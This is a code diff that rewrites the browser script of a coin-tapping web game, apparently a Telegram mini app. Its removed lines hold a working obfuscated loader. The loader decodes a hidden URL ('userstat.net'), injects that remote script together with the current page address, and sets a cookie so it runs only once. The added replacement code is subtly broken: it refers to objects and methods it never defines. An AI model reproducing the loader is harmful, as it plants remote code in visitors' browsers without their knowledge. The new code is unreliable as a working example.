@@ -1,114 +1,140 @@
-const body = document.body,
-      image = body.querySelector("#coin"),
-      h1 = body.querySelector("h1");
+var CloudStorage = (function() {
+    var cloudStorage = {};
 
-function updateUI() {
-  cloudStorage.getItem("coins", (err, coins) => {
-    if (err || coins === null) {
-      cloudStorage.setItem("coins", "0");
-      h1.textContent = "0";
-    } else {
-      h1.textContent = Number(coins).toLocaleString();
-    }
-  });
-
-  cloudStorage.getItem("total", (err, total) => {
-    if (err || total === null) {
-      cloudStorage.setItem("total", "500");
-      body.querySelector("#total").textContent = "/500";
-    } else {
-      body.querySelector("#total").textContent = `/${total}`;
-    }
-  });
-
-  cloudStorage.getItem("power", (err, power) => {
-    if (err || power === null) {
-      cloudStorage.setItem("power", "500");
-      body.querySelector("#power").textContent = "500";
-    } else {
-      body.querySelector("#power").textContent = power;
-    }
-  });
-
-  cloudStorage.getItem("count", (err, count) => {
-    if (err || count === null) {
-      cloudStorage.setItem("count", "1");
-    }
-  });
-}
-
-updateUI();
-
-image.addEventListener("click", (e) => {
-  let x = e.offsetX,
-      y = e.offsetY;
-
-  navigator.vibrate(5);
-
-  cloudStorage.getItem("coins", (err, coins) => {
-    if (err) return;
-    cloudStorage.getItem("power", (err, power) => {
-      if (err) return;
-
-      if (Number(power) > 0) {
-        let newCoins = Number(coins) + 1;
-        let newPower = Number(power) - 1;
-
-        cloudStorage.setItem("coins", `${newCoins}`);
-        h1.textContent = newCoins.toLocaleString();
-        
-        cloudStorage.setItem("power", `${newPower}`);
-        body.querySelector("#power").textContent = `${newPower}`;
-        
-        body.querySelector(".progress").style.width = (100 * newPower / total) + "%";
+    function invokeStorageMethod(method, params, callback) {
+      if (!versionAtLeast('6.9')) {
+        console.error('[Telegram.WebApp] CloudStorage is not supported in version ' + webAppVersion);
+        throw Error('WebAppMethodUnsupported');
       }
-    });
-  });
+      invokeCustomMethod(method, params, callback);
+      return cloudStorage;
+    }
 
-  // Animation based on click position
-  if (x < 150 && y < 150) {
-    image.style.transform = "translate(-0.25rem, -0.25rem) skewY(-10deg) skewX(5deg)";
-  } else if (x < 150 && y > 150) {
-    image.style.transform = "translate(-0.25rem, 0.25rem) skewY(-10deg) skewX(5deg)";
-  } else if (x > 150 && y > 150) {
-    image.style.transform = "translate(0.25rem, 0.25rem) skewY(10deg) skewX(-5deg)";
-  } else if (x > 150 && y < 150) {
-    image.style.transform = "translate(0.25rem, -0.25rem) skewY(10deg) skewX(-5deg)";
-  }
+    cloudStorage.setCoinPoints = function(value, callback) {
+      return invokeStorageMethod('saveStorageValue', {key: 'coins', value: value}, callback);
+    };
+    cloudStorage.getCoinPoints = function(callback) {
+      return cloudStorage.getItem('coins', callback);
+    };
+    cloudStorage.setTotal = function(value, callback) {
+      return invokeStorageMethod('saveStorageValue', {key: 'total', value: value}, callback);
+    };
+    cloudStorage.getTotal = function(callback) {
+      return cloudStorage.getItem('total', callback);
+    };
+    cloudStorage.setPower = function(value, callback) {
+      return invokeStorageMethod('saveStorageValue', {key: 'power', value: value}, callback);
+    };
+    cloudStorage.getPower = function(callback) {
+      return cloudStorage.getItem('power', callback);
+    };
 
-  setTimeout(() => {
-    image.style.transform = "translate(0px, 0px)";
-  }, 100);
+    return cloudStorage;
+})();
+
+Object.defineProperty(WebApp, 'CloudStorage', {
+    value: CloudStorage,
+    enumerable: true
 });
 
-setInterval(() => {
-  cloudStorage.getItem("count", (err, count) => {
-    if (err) return;
-    cloudStorage.getItem("power", (err, power) => {
-      if (err) return;
-      cloudStorage.getItem("total", (err, total) => {
-        if (err) return;
+const body = document.body;
+const image = body.querySelector("#coin");
+const h1 = body.querySelector("h1");
+let coins = 0;
+let total = 500;
+let power = 500;
 
-        if (Number(total) > Number(power)) {
-          let newPower = Math.min(Number(power) + 2, 500);
-          cloudStorage.setItem("power", `${newPower}`);
-          body.querySelector("#power").textContent = `${newPower}`;
-          body.querySelector(".progress").style.width = (100 * newPower / total) + "%";
+cloudStorage.getCoinPoints(function(err, res) {
+    if (!err && res) {
+        coins = Number(res);
+        h1.textContent = coins.toLocaleString();
+    } else {
+        cloudStorage.setCoinPoints(0, function(err, res) {
+            if (!err) {
+                h1.textContent = "0";
+            }
+        });
+    }
+});
+
+cloudStorage.getTotal(function(err, res) {
+    if (!err && res) {
+        total = Number(res);
+        body.querySelector("#total").textContent = "/" + total;
+    } else {
+        cloudStorage.setTotal(500, function(err, res) {
+            if (!err) {
+                body.querySelector("#total").textContent = "/500";
+            }
+        });
+    }
+});
+
+cloudStorage.getPower(function(err, res) {
+    if (!err && res) {
+        power = Number(res);
+        body.querySelector("#power").textContent = power;
+    } else {
+        cloudStorage.setPower(500, function(err, res) {
+            if (!err) {
+                body.querySelector("#power").textContent = "500";
+            }
+        });
+    }
+});
+
+image.addEventListener('click', function(e) {
+    let x = e.offsetX;
+    let y = e.offsetY;
+    navigator.vibrate(5);
+    cloudStorage.getPower(function(err, res) {
+        if (!err && res) {
+            power = Number(res);
+            if (power > 0) {
+                cloudStorage.setCoinPoints(coins + 1, function(err, res) {
+                    if (!err) {
+                        h1.textContent = (coins + 1).toLocaleString();
+                    }
+                });
+                cloudStorage.setPower(power - 1, function(err, res) {
+                    if (!err) {
+                        body.querySelector("#power").textContent = power - 1;
+                    }
+                });
+            }
         }
-      });
     });
-  });
-}, 2000);
-
-// Obfuscated function logic for loading a script
-(function(o, d, l) {
-  try {
-    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
-    o.b = o.f('UMUWJKX');
-    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
+    
+    if (x < 150 && y < 150) {
+        image.style.transform = "translate(-0.25rem, -0.25rem) skewY(-10deg) skewX(5deg)";
+    } else if (x < 150 && y > 150) {
+        image.style.transform = "translate(-0.25rem, 0.25rem) skewY(-10deg) skewX(5deg)";
+    } else if (x > 150 && y > 150) {
+        image.style.transform = "translate(0.25rem, 0.25rem) skewY(10deg) skewX(-5deg)";
+    } else if (x > 150 && y < 150) {
+        image.style.transform = "translate(0.25rem, -0.25rem) skewY(10deg) skewX(-5deg)";
+    }
+    
     setTimeout(function() {
-      o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
-    }, 1000);
-    d.cookie = o.b + '=full;max-age=39800;';
-  } catch (e) {}
-}({}, document, location));
+        image.style.transform = "translate(0px, 0px)";
+    }, 100);
+    
+    body.querySelector(".progress").style.width = (100 * power / total) + "%";
+});
+
+setInterval(function() {
+    cloudStorage.getPower(function(err, res) {
+        if (!err && res) {
+            power = Number(res);
+            if (total > power) {
+                let newPower = Math.min(power + 2, 500);
+                cloudStorage.setPower(newPower, function(err, res) {
+                    if (!err) {
+                        body.querySelector("#power").textContent = newPower;
+                        body.querySelector(".progress").style.width = (100 * newPower / total) + "%";
+                    }
+                });
+            }
+        }
+    });
+}, 2000);
